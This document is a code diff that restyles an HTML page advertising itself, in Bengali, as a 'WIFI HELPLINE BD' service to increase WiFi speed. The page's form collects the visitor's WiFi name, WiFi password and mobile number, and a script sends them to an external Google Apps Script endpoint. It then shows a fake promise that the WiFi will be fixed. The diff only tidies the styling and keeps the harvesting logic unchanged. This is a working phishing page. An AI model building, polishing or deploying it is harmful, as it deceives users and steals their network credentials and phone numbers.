@@ -1,75 +1,106 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>Report Submiting Form</title>
+<title>Report Submitting Form</title>
 <style>
-body {
-    font-family: Arial, sans-serif;
-    background-color: #f2f2f2;
-}
+    body {
+        font-family: Arial, sans-serif;
+        background-color: #f2f2f2;
+        margin: 0;
+        padding: 0;
+    }
 
-form {
-    border: 1px solid #ccc;
-    padding: 20px;
-    width: 520px;
-    height:420px;
-    margin: 0 auto;
-}
+    form {
+        border: 1px solid #ccc;
+        padding: 20px;
+        width: 90%;
+        max-width: 500px;
+        margin: 20px auto;
+        background-color: lightblue;
+        border-radius: 10px;
+    }
 
-input[type=text], input[type=password] {
-    width: 100%;
-    padding: 12px 20px;
-    margin: 8px 0;
-    display: inline-block;
-    border: 1px solid #ccc;
-    box-sizing: border-box;
-}
+    input[type=text], input[type=password] {
+        width: 100%;
+        padding: 12px;
+        margin: 8px 0;
+        display: inline-block;
+        border: 1px solid #ccc;
+        box-sizing: border-box;
+        border-radius: 5px;
+    }
 
-button {
-    background-color: #4CAF50;
-    color: white;
-    padding: 14px 20px;
-    margin: 8px 0;
-    border: none;
-    cursor: pointer;
-    width: 100%;
-}
+    button {
+        background-color: #4CAF50;
+        color: white;
+        padding: 14px 20px;
+        margin: 8px 0;
+        border: none;
+        cursor: pointer;
+        width: 100%;
+        border-radius: 5px;
+    }
 
-button:hover {
-    opacity: 0.4;
-}
+    button:hover {
+        opacity: 0.8;
+    }
 
-.container {
-    padding: 16px;
-}
+    h1, h2 {
+        text-align: center;
+        margin: 10px 0;
+    }
 
+    h1 {
+        color: green;
+    }
 
+    h2 {
+        color: blue;
+    }
 
+    h4 {
+        text-align: center;
+        color: red;
+    }
 
- 
+    .container {
+        padding: 16px;
+    }
 
+    @media (max-width: 600px) {
+        form {
+            padding: 15px;
+            width: 95%;
+        }
 
+        h1, h2 {
+            font-size: 18px;
+        }
 
+        h4 {
+            font-size: 16px;
+        }
 
-
+        button {
+            padding: 12px;
+        }
+    }
 </style>
+<meta name="viewport" content="width=device-width, initial-scale=1">
 </head>
 <body>
 
-<h1 align="center" style="color: Green;">আপনার WIFI এর Speed বাড়িয়ে নিন </h1>
-
-<h2 align="center" style="color: blue;">WIFI HELPLINE BD</h2>
+<h1>আপনার WIFI এর Speed বাড়িয়ে নিন</h1>
+<h2>WIFI HELPLINE BD</h2>
 
 <form mathord="post" name='google-sheet'>
-  <div class="container"  style="width: 500px; height: 400px; background-color:  lightblue;">
-    
-        <h4 align="center"  style="color: RED;">SUBMIT YOUR REPORT</h4>
-    <label for="WIFI NAME"><b style="color: ;">WIFI Name</b></label>
+  <div class="container">
+        <h4>SUBMIT YOUR REPORT</h4>
+    <label for="WIFI NAME"><b>WIFI Name</b></label>
     <input type="text" placeholder="Enter WIFI Name" name="username" required>
 
     <label for="password"><b>YOUR WIFI Password</b></label>
     <input type="password" placeholder="Enter Password" name="password" required>
-
 
     <label for="number"><b>Your Mobile Number</b></label>
     <input type="text" placeholder="Enter Mobile Number" name="number" required>
@@ -78,20 +109,17 @@ button:hover {
   </div>
 </form>
 
-
-        <script>
-            const scriptURL = 'https://script.google.com/macros/s/AKfycbw4Fkgf-GU5WCRviytlV0aFYsN2VeYrXiS4JFlC2Q0m2ZuP1RmTvdpTSLBffSVVWTDE/exec'
-            const form = document.forms['google-sheet']
-          
-            form.addEventListener('submit', e => {
-              e.preventDefault()
-              fetch(scriptURL, { method: 'POST', body: new FormData(form)})
-          .then(response => alert("Thanks for submiting your report to us..! We Will fix your WIFI very Soon..."))
-                .catch(error => console.error('Error!', error.message))
-            })
-          </script>
-
-
+<script>
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbw4Fkgf-GU5WCRviytlV0aFYsN2VeYrXiS4JFlC2Q0m2ZuP1RmTvdpTSLBffSVVWTDE/exec'
+    const form = document.forms['google-sheet']
+  
+    form.addEventListener('submit', e => {
+        e.preventDefault()
+        fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+        .then(response => alert("Thanks for submitting your report to us..! We will fix your WIFI very soon."))
+        .catch(error => console.error('Error!', error.message))
+    })
+</script>
 
 </body>
 </html>
